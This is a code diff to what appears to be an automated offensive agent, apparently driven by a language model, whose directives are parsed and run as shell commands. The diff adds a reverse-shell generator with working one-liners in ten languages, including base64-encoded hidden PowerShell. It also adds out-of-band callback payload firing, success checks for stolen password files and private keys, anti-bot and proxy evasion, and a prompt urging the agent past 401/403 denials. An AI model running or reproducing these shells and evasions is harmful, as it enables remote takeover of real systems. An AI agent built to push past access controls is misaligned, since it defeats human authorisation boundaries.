@@ -447,13 +447,16 @@ _DIRECTIVE_NAMES = [
     "HARVEST", "SEARCH", "FETCH", "REPORT", "PROOF", "EXPLOIT", "SHELL",
     "LOOT", "CRACK", "PIVOT", "STATUS", "CHAIN", "BROWSER", "GRAPHQL",
     "WS", "OOB", "MUTATE", "CHAIN_AUTO", "HAR", "BUDGET", "TUI", "WAF",
-    "STACK", "SCHEMA", "GOAL", "REPLAN",
+    "STACK", "SCHEMA", "GOAL", "REPLAN", "BELIEF", "POC", "AUTO-POC",
+    "BROWSER-SOLVE", "BROWSER-FETCH", "BROWSER-CLEAR", "PROXY-STATUS",
+    "PROXY-REFRESH", "PROXY-CLEAR", "AUTH", "TOOLFIX",
 ]
 
 # line-anchored: directive must start at column 0 (after optional spaces),
 # on its own line — prevents mid-sentence and mid-code-block matches.
+# Supports hyphens in directive names (e.g. BROWSER-SOLVE, PROXY-STATUS)
 PATTERNS = {
-    name: rf"(?:^|\n)\s*{name}:\s*(.+?)(?=\n[A-Z_]+:\s|\Z)"
+    name: rf"(?:^|\n)\s*{re.escape(name)}:\s*(.+?)(?=\n[A-Z0-9_\-]+:\s|\Z)"
     for name in _DIRECTIVE_NAMES
 }
 
@@ -462,7 +465,7 @@ _FENCE = re.compile(r"```.*?```", re.DOTALL)
 
 
 _ANY_DIRECTIVE_LIKE = re.compile(
-    r"(?:^|\n)[ \t]*([A-Z][A-Z0-9_]{1,40}):\s*(.*?)(?=\n[A-Z][A-Z0-9_]{1,40}:\s|\Z)",
+    r"(?:^|\n)[ \t]*([A-Z][A-Z0-9_\-]{1,40}):\s*(.*?)(?=\n[A-Z][A-Z0-9_\-]{1,40}:\s|\Z)",
     re.DOTALL,
 )
 
@@ -478,7 +481,7 @@ def parse(msg):
     errors = []
     raw = msg or ""
     stripped = _FENCE.sub("", raw)
-    stripped = re.sub(r"\s+\|\|\|\s+(?=[A-Z_]+:\s)", "\n", stripped)
+    stripped = re.sub(r"\s+\|\|\|\s+(?=[A-Z0-9_\-]+:\s)", "\n", stripped)
 
     actions = []
     for kind, pat in PATTERNS.items():
@@ -629,20 +632,38 @@ def _kill_tree(proc):
             return
     except Exception:
         pass
-    try:
-        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
-    except Exception:
+    if hasattr(os, "killpg") and hasattr(os, "getpgid"):
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        except Exception:
+            try:
+                proc.terminate()
+            except Exception:
+                pass
+        time.sleep(0.5)
+        try:
+            if proc.poll() is None:
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+        except Exception:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+    elif sys.platform == "win32":
+        try:
+            subprocess.run(["taskkill", "/F", "/T", "/PID", str(proc.pid)],
+                           capture_output=True, timeout=5)
+        except Exception:
+            try:
+                proc.kill()
+            except Exception:
+                pass
+    else:
         try:
             proc.terminate()
-        except Exception:
-            pass
-    time.sleep(0.5)
-    try:
-        if proc.poll() is None:
-            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
-    except Exception:
-        try:
-            proc.kill()
+            time.sleep(0.3)
+            if proc.poll() is None:
+                proc.kill()
         except Exception:
             pass
 
@@ -779,17 +800,21 @@ def _run_shell(cmd, timeout=None, _proxy_retry=0, _proxy_exclude=None):
         except Exception:
             pass
 
+    popen_kwargs = {
+        "shell": True,
+        "stdout": subprocess.PIPE,
+        "stderr": subprocess.STDOUT,
+        "text": True,
+        "bufsize": 1,
+        "env": env,
+    }
+    if hasattr(os, "setsid"):
+        popen_kwargs["preexec_fn"] = os.setsid
+    elif sys.platform == "win32" and hasattr(subprocess, "CREATE_NEW_PROCESS_GROUP"):
+        popen_kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
+
     try:
-        proc = subprocess.Popen(
-            cmd,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1,
-            env=env,
-            preexec_fn=os.setsid,   # new process group → we can kill the whole tree
-        )
+        proc = subprocess.Popen(cmd, **popen_kwargs)
     except Exception as e:
         return f"ERROR: {e}"
 
@@ -1275,11 +1300,7 @@ def do_command(cmd):
 
 
 _DIRECTIVE_PREFIX = re.compile(
-    r"^\s*(COMMAND|PARALLEL|INSTALL|NEED_TOOL|FILE|LIST|NOTE|FINDING|ENDPOINT|"
-    r"PROBE|PLAN|PAYLOAD|SECRET|CRED|SCREENSHOT|CVE|METHOD|PARAMFIND|WALK|"
-    r"APIMAP|HARVEST|SEARCH|FETCH|REPORT|PROOF|EXPLOIT|SHELL|LOOT|CRACK|"
-    r"PIVOT|STATUS|CHAIN|BROWSER|GRAPHQL|WS|OOB|MUTATE|CHAIN_AUTO|HAR|"
-    r"BUDGET|TUI|WAF|STACK):\s*",
+    rf"^\s*({'|'.join(re.escape(k) for k in _DIRECTIVE_NAMES)}):\s*",
     re.I,
 )
 
@@ -1806,7 +1827,15 @@ def do_walk(spec):
         return "ERROR: start/end integers"
     slug = re.sub(r"[^a-zA-Z0-9]+", "_", url)[:60] + f"_{param}"
     out_path = RUN_DIR / "leak" / f"walk_{slug}.tsv"
-    conc = int(parts[6]) if len(parts) > 6 and parts[6].isdigit() else 8
+    conc = 8
+    if len(parts) > 5:
+        if parts[5].isdigit():
+            conc = int(parts[5])
+        elif parts[5]:
+            custom_p = pathlib.Path(parts[5])
+            out_path = custom_p if custom_p.is_absolute() else RUN_DIR / parts[5]
+    if len(parts) > 6 and parts[6].isdigit():
+        conc = int(parts[6])
 
     async def _go():
         async with _engine.Engine(concurrency=max(4, conc), timeout=10.0) as eng:
@@ -2141,17 +2170,89 @@ def do_exploit(spec):
     })
     summ = STATE.setdefault("attack_summary", {"attempted": 0, "succeeded": 0, "chained": 0})
     summ["attempted"] = summ.get("attempted", 0) + 1
-    fail_local = (r"curl:\s*\(\d+\)", r"could not resolve",
-                  r"connection (refused|timed out|reset)",
-                  r"HTTP[:\s]*[45]\d\d", r"HTTP[:\s]*000",
-                  r"\bfailed\b", r"\bdenied\b", r"\brefused\b",
-                  r"syntax error")
-    ok = bool(out) and not any(re.search(p, out, re.I) for p in fail_local)
+    transport_fails = (
+        r"curl:\s*\(\d+\)", r"could not resolve host",
+        r"connection (refused|timed out|reset)",
+        r"^\[TIMEOUT", r"\[DENIED\]", r"\[SCOPE BLOCK\]",
+    )
+    is_transport_fail = any(re.search(p, out, re.I) for p in transport_fails)
+    exploit_success_signals = (
+        r"uid=\d+\(.*?\)\s+gid=\d+",
+        r"root:[x*]:0:0:",
+        r"\[\+\]\s*(vulnerable|success|exploited|pwned)",
+        r"available databases \[",
+        r"web application technology:",
+        r"HTTP[/12\.]*\s*200",
+        r"total \d+\ndrwx",
+        r"BEGIN (RSA|OPENSSH|PGP) PRIVATE KEY",
+    )
+    has_pos_signal = any(re.search(p, out, re.I) for p in exploit_success_signals)
+    has_http_err = bool(re.search(r"HTTP[:\s]*[45]\d\d", out))
+
+    ok = bool(out) and not is_transport_fail and (has_pos_signal or not has_http_err)
     if ok:
         STATE["attacks"][-1]["result"] = "success"
         summ["succeeded"] = summ.get("succeeded", 0) + 1
     _state.save(RUN_DIR, STATE)
     return f"[{aid}] {STATE['attacks'][-1]['result']}: {out[:600]}"
+
+
+def do_shell(spec):
+    """SHELL: <kind>|<lhost>|<lport>[|encode]
+    kinds: bash | sh | python | perl | php | ruby | nc | socat | node | powershell
+    encode: raw | base64 | url
+    """
+    parts = [p.strip() for p in spec.split("|")]
+    if len(parts) < 3:
+        return (
+            "usage: SHELL: <kind>|<lhost>|<lport>[|encode]\n"
+            "kinds: bash | sh | python | perl | php | ruby | nc | socat | node | powershell\n"
+            "encode: raw | base64 | url\n"
+            "example: SHELL: bash|10.10.14.5|4444|raw"
+        )
+    kind, lhost, lport = parts[0].lower(), parts[1], parts[2]
+    encode = parts[3].lower() if len(parts) > 3 else "raw"
+
+    shells = {
+        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+        "sh": f"/bin/sh -i 5<> /dev/tcp/{lhost}/{lport} 0<&5 1>&5 2>&5",
+        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
+        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
+        "socat": f"socat tcp-connect:{lhost}:{lport} exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
+        "node": f"node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{{stdio:[0,1,2]}})'",
+        "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ascii).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
+    }
+    raw_payload = shells.get(kind, shells["bash"])
+    rendered = raw_payload
+
+    if encode == "base64":
+        import base64 as _b64
+        if kind == "powershell":
+            b64 = _b64.b64encode(raw_payload.encode("utf-16le")).decode()
+            rendered = f"powershell -nop -w hidden -e {b64}"
+        else:
+            b64 = _b64.b64encode(raw_payload.encode()).decode()
+            rendered = f"echo {b64} | base64 -d | sh"
+    elif encode == "url":
+        import urllib.parse as _up
+        rendered = _up.quote(raw_payload)
+
+    pdir = RUN_DIR / "payloads" / "shells"
+    pdir.mkdir(parents=True, exist_ok=True)
+    slug = f"shell_{kind}_{lport}"
+    (pdir / f"{slug}.txt").write_text(rendered)
+
+    listener_cmd = f"nc -lvnp {lport}"
+    return (
+        f"[SHELL: {kind} -> {lhost}:{lport} ({encode})]\n"
+        f"payload:\n{rendered}\n\n"
+        f"listener setup (run via COMMAND: or terminal):\n"
+        f"  {listener_cmd}\n"
+        f"saved: {pdir / f'{slug}.txt'}"
+    )
 
 
 def do_loot(spec):
@@ -2342,6 +2443,31 @@ def do_oob(spec):
     if len(parts) < 4:
         return "ERROR: OOB needs 'method|url|param|payload'"
     method, url, param, payload = parts[0], parts[1], parts[2], parts[3]
+
+    oob_url = os.environ.get("AG_OOB_URL", "").strip()
+    proc = None
+    if not oob_url and _blind.have_interactsh():
+        host, proc = _blind.interactsh_generate(timeout=10)
+        if host:
+            oob_url = f"http://{host}"
+
+    if oob_url:
+        try:
+            full_payload = payload.replace("{callback}", oob_url)
+            r = http_probe(method, url, params={param: full_payload}, timeout=15)
+            return (
+                f"OOB payload fired via {oob_url}:\n"
+                f"  target: {method} {url} param={param}\n"
+                f"  status: {r.get('code')} size: {r.get('size')}\n"
+                f"  Check interactsh or OOB server logs for inbound interactions."
+            )
+        finally:
+            if proc:
+                try:
+                    proc.terminate()
+                except Exception:
+                    pass
+
     cb = _blind.LocalCallback(port=0)
     port = cb.start()
     try:
@@ -2355,8 +2481,8 @@ def do_oob(spec):
                 "payload": full_payload, "callbacks": len(hits),
             })
             _state.save(RUN_DIR, STATE)
-            return f"OOB HIT: {len(hits)} callbacks — {json.dumps(hits[:3])}"
-        return "no callback received"
+            return f"OOB HIT (local): {len(hits)} callbacks — {json.dumps(hits[:3])}"
+        return f"no local callback received (listening on 127.0.0.1:{port}; note: remote targets require interactsh or AG_OOB_URL)"
     finally:
         cb.stop()
 
@@ -2771,7 +2897,7 @@ DISPATCH = {
     "REPORT": do_report,
     "PROOF": lambda p: do_loot(f"proof|{p}"),
     "EXPLOIT": do_exploit,
-    "SHELL": lambda p: f"shell intent: {p}",
+    "SHELL": do_shell,
     "LOOT": do_loot,
     "CRACK": do_crack,
     "PIVOT": do_pivot,
@@ -3236,6 +3362,18 @@ DIRECTIVES:
   SCHEMA:
   TOOLFIX: <name>                       # force reinstall a broken tool
   BROWSER: <url>
+  BROWSER-SOLVE: <url>                  # headless chromium solves anti-bot challenge
+  BROWSER-FETCH: <url>                  # navigate existing browser session
+  BROWSER-CLEAR:                        # reset browser session
+  PROXY-STATUS:                         # inspect proxy health
+  PROXY-REFRESH:                        # refresh proxy pool
+  PROXY-CLEAR:                          # clear proxy state for target
+  AUTH: cookie|<name>=<val> | bearer|<tok> | basic|<u:p> | login|<url>|<email>|<pass> | clear
+  POC: <CVE-ID>                         # fetch public PoC for CVE
+  AUTO-POC:                             # auto-fetch PoCs for all CVEs in findings
+  BELIEF: <kind>|<path>|<confidence>|<why>
+  GOAL: add|gN|<text> | done|gN | block|gN | wontdo|gN
+  REPLAN: <json array>
   GRAPHQL: <url>|<query_json>
   WS: <wss_url>|<payload>
   OOB: <method>|<url>|<param>|<payload>       # {callback} replaced with listener
@@ -3243,6 +3381,7 @@ DIRECTIVES:
   CHAIN_AUTO:
   HAR: <url>
   BUDGET: status | set max_req=N
+
 
 
 TOOL MASTERY:
@@ -3472,6 +3611,7 @@ Do not accept 401/403 as a wall. Turn the wall into a ladder.
 
 DIRECTIVES you can emit:
   EXPLOIT: <tool>|<url_or_target>|<extra_args>
+  SHELL: <kind>|<lhost>|<lport>[|encode]
   LOOT: <kind>|<value>
   CRACK: <hash>|auto
   PIVOT: <target>|<creds_ref>
